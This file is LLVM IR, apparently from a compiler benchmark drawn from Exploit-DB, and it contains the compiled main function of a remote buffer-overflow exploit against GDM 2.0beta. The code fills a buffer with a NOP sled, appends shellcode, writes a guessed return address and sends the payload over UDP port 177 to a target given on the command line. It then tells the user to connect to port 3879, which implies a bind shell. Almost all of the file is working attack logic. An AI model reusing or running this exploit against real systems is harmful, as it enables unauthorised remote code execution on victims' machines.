; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/remote/extr_19948.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/remote/extr_19948.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.sockaddr_in = type { %struct.TYPE_2__, i8*, i32 }
%struct.TYPE_2__ = type { i32 }
%struct.sockaddr = type { i32 }

@.str = private unnamed_addr constant [82 x i8] c"\0AGDM 2.0betaX exploit by AbraxaS (abraxas@sekure.de)\0AUsage: %s [target] [offset]\0A\00", align 1
@AF_INET = common dso_local global i32 0, align 4
@SOCK_DGRAM = common dso_local global i32 0, align 4
@.str.1 = private unnamed_addr constant [8 x i8] c"Connect\00", align 1
@NOP = common dso_local global i32 0, align 4
@code = common dso_local global i8* null, align 8
@.str.2 = private unnamed_addr constant [31 x i8] c"\0AConnect to %s, port 3879 now.\00", align 1
@.str.3 = private unnamed_addr constant [26 x i8] c"\0ABut behave :) --abraxas\0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i8**, align 8
  %5 = alloca i8, align 1
  %6 = alloca i32, align 4
  %7 = alloca [6 x i16], align 2
  %8 = alloca [1400 x i8], align 16
  %9 = alloca i64, align 8
  %10 = alloca %struct.sockaddr_in, align 8
  %11 = alloca [1412 x i8], align 16
  store i32 %0, i32* %3, align 4
  store i8** %1, i8*** %4, align 8
  %12 = load i32, i32* %3, align 4
  %13 = icmp slt i32 %12, 3
  br i1 %13, label %14, label %20

14:                                               ; preds = %2
  %15 = load i8**, i8*** %4, align 8
  %16 = getelementptr inbounds i8*, i8** %15, i64 0
  %17 = load i8*, i8** %16, align 8
  %18 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([82 x i8], [82 x i8]* @.str, i64 0, i64 0), i8* %17)
  %19 = call i32 @exit(i32 0) #3
  unreachable

20:                                               ; preds = %2
  %21 = load i8**, i8*** %4, align 8
  %22 = getelementptr inbounds i8*, i8** %21, i64 2
  %23 = load i8*, i8** %22, align 8
  %24 = call i32 @atoi(i8* %23)
  %25 = sub i32 -1073743680, %24
  %26 = zext i32 %25 to i64
  store i64 %26, i64* %9, align 8
  %27 = load i32, i32* @AF_INET, align 4
  %28 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %10, i32 0, i32 2
  store i32 %27, i32* %28, align 8
  %29 = call i8* @htons(i32 177)
  %30 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %10, i32 0, i32 1
  store i8* %29, i8** %30, align 8
  %31 = load i8**, i8*** %4, align 8
  %32 = getelementptr inbounds i8*, i8** %31, i64 1
  %33 = load i8*, i8** %32, align 8
  %34 = call i32 @resolve(i8* %33)
  %35 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %10, i32 0, i32 0
  %36 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %35, i32 0, i32 0
  store i32 %34, i32* %36, align 8
  %37 = load i32, i32* @AF_INET, align 4
  %38 = load i32, i32* @SOCK_DGRAM, align 4
  %39 = call i32 @socket(i32 %37, i32 %38, i32 0)
  store i32 %39, i32* %6, align 4
  %40 = load i32, i32* %6, align 4
  %41 = bitcast %struct.sockaddr_in* %10 to %struct.sockaddr*
  %42 = call i64 @connect(i32 %40, %struct.sockaddr* %41, i32 4)
  %43 = icmp slt i64 %42, 0
  br i1 %43, label %44, label %47

44:                                               ; preds = %20
  %45 = call i32 @perror(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.1, i64 0, i64 0))
  %46 = call i32 @exit(i32 0) #3
  unreachable

47:                                               ; preds = %20
  %48 = getelementptr inbounds [1400 x i8], [1400 x i8]* %8, i64 0, i64 0
  %49 = load i32, i32* @NOP, align 4
  %50 = call i32 @memset(i8* %48, i32 %49, i32 1400)
  %51 = getelementptr inbounds [1412 x i8], [1412 x i8]* %11, i64 0, i64 0
  %52 = call i32 @bzero(i8* %51, i32 1412)
  %53 = call i8* @htons(i32 1)
  %54 = ptrtoint i8* %53 to i16
  %55 = getelementptr inbounds [6 x i16], [6 x i16]* %7, i64 0, i64 0
  store i16 %54, i16* %55, align 2
  %56 = call i8* @htons(i32 4)
  %57 = ptrtoint i8* %56 to i16
  %58 = getelementptr inbounds [6 x i16], [6 x i16]* %7, i64 0, i64 1
  store i16 %57, i16* %58, align 2
  %59 = call i8* @htons(i32 1405)
  %60 = ptrtoint i8* %59 to i16
  %61 = getelementptr inbounds [6 x i16], [6 x i16]* %7, i64 0, i64 2
  store i16 %60, i16* %61, align 2
  %62 = call i8* @htons(i32 1400)
  %63 = ptrtoint i8* %62 to i16
  %64 = getelementptr inbounds [6 x i16], [6 x i16]* %7, i64 0, i64 3
  store i16 %63, i16* %64, align 2
  %65 = call i8* @htons(i32 0)
  %66 = ptrtoint i8* %65 to i16
  %67 = getelementptr inbounds [6 x i16], [6 x i16]* %7, i64 0, i64 4
  store i16 %66, i16* %67, align 2
  %68 = call i8* @htons(i32 0)
  %69 = ptrtoint i8* %68 to i16
  %70 = getelementptr inbounds [6 x i16], [6 x i16]* %7, i64 0, i64 5
  store i16 %69, i16* %70, align 2
  %71 = getelementptr inbounds [6 x i16], [6 x i16]* %7, i64 0, i64 0
  %72 = load i16, i16* %71, align 2
  %73 = getelementptr inbounds [1412 x i8], [1412 x i8]* %11, i64 0, i64 0
  %74 = bitcast i8* %73 to i16*
  store i16 %72, i16* %74, align 16
  %75 = getelementptr inbounds [6 x i16], [6 x i16]* %7, i64 0, i64 1
  %76 = load i16, i16* %75, align 2
  %77 = getelementptr inbounds [1412 x i8], [1412 x i8]* %11, i64 0, i64 2
  %78 = bitcast i8* %77 to i16*
  store i16 %76, i16* %78, align 2
  %79 = getelementptr inbounds [6 x i16], [6 x i16]* %7, i64 0, i64 2
  %80 = load i16, i16* %79, align 2
  %81 = getelementptr inbounds [1412 x i8], [1412 x i8]* %11, i64 0, i64 4
  %82 = bitcast i8* %81 to i16*
  store i16 %80, i16* %82, align 4
  %83 = getelementptr inbounds [6 x i16], [6 x i16]* %7, i64 0, i64 3
  %84 = load i16, i16* %83, align 2
  %85 = getelementptr inbounds [1412 x i8], [1412 x i8]* %11, i64 0, i64 6
  %86 = bitcast i8* %85 to i16*
  store i16 %84, i16* %86, align 2
  %87 = getelementptr inbounds [6 x i16], [6 x i16]* %7, i64 0, i64 4
  %88 = load i16, i16* %87, align 2
  %89 = getelementptr inbounds [1412 x i8], [1412 x i8]* %11, i64 0, i64 1408
  %90 = bitcast i8* %89 to i16*
  store i16 %88, i16* %90, align 16
  %91 = getelementptr inbounds [6 x i16], [6 x i16]* %7, i64 0, i64 5
  %92 = load i16, i16* %91, align 2
  %93 = getelementptr inbounds [1412 x i8], [1412 x i8]* %11, i64 0, i64 1410
  %94 = bitcast i8* %93 to i16*
  store i16 %92, i16* %94, align 2
  %95 = getelementptr inbounds [1400 x i8], [1400 x i8]* %8, i64 0, i64 0
  %96 = getelementptr inbounds i8, i8* %95, i64 1400
  %97 = load i8*, i8** @code, align 8
  %98 = call i32 @strlen(i8* %97)
  %99 = sext i32 %98 to i64
  %100 = sub i64 0, %99
  %101 = getelementptr inbounds i8, i8* %96, i64 %100
  %102 = load i8*, i8** @code, align 8
  %103 = load i8*, i8** @code, align 8
  %104 = call i32 @strlen(i8* %103)
  %105 = call i32 @memcpy(i8* %101, i8* %102, i32 %104)
  %106 = getelementptr inbounds [1400 x i8], [1400 x i8]* %8, i64 0, i64 0
  %107 = bitcast i8* %106 to i64*
  store i64 16777343, i64* %107, align 16
  %108 = getelementptr inbounds [1400 x i8], [1400 x i8]* %8, i64 0, i64 4
  %109 = bitcast i8* %108 to i64*
  store i64 0, i64* %109, align 4
  %110 = getelementptr inbounds [1400 x i8], [1400 x i8]* %8, i64 0, i64 8
  %111 = bitcast i8* %110 to i64*
  store i64 0, i64* %111, align 8
  %112 = load i64, i64* %9, align 8
  %113 = getelementptr inbounds [1400 x i8], [1400 x i8]* %8, i64 0, i64 32
  %114 = bitcast i8* %113 to i64*
  store i64 %112, i64* %114, align 16
  %115 = getelementptr inbounds [1412 x i8], [1412 x i8]* %11, i64 0, i64 0
  %116 = getelementptr inbounds i8, i8* %115, i64 8
  %117 = getelementptr inbounds [1400 x i8], [1400 x i8]* %8, i64 0, i64 0
  %118 = call i32 @memcpy(i8* %116, i8* %117, i32 1400)
  %119 = load i32, i32* %6, align 4
  %120 = getelementptr inbounds [1412 x i8], [1412 x i8]* %11, i64 0, i64 0
  %121 = call i32 @write(i32 %119, i8* %120, i32 1412)
  %122 = load i8**, i8*** %4, align 8
  %123 = getelementptr inbounds i8*, i8** %122, i64 1
  %124 = load i8*, i8** %123, align 8
  %125 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([31 x i8], [31 x i8]* @.str.2, i64 0, i64 0), i8* %124)
  %126 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([26 x i8], [26 x i8]* @.str.3, i64 0, i64 0))
  %127 = load i32, i32* %6, align 4
  %128 = call i32 @close(i32 %127)
  ret i32 0
}

declare dso_local i32 @printf(i8*, ...) #1

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #2

declare dso_local i32 @atoi(i8*) #1

declare dso_local i8* @htons(i32) #1

declare dso_local i32 @resolve(i8*) #1

declare dso_local i32 @socket(i32, i32, i32) #1

declare dso_local i64 @connect(i32, %struct.sockaddr*, i32) #1

declare dso_local i32 @perror(i8*) #1

declare dso_local i32 @memset(i8*, i32, i32) #1

declare dso_local i32 @bzero(i8*, i32) #1

declare dso_local i32 @memcpy(i8*, i8*, i32) #1

declare dso_local i32 @strlen(i8*) #1

declare dso_local i32 @write(i32, i8*, i32) #1

declare dso_local i32 @close(i32) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
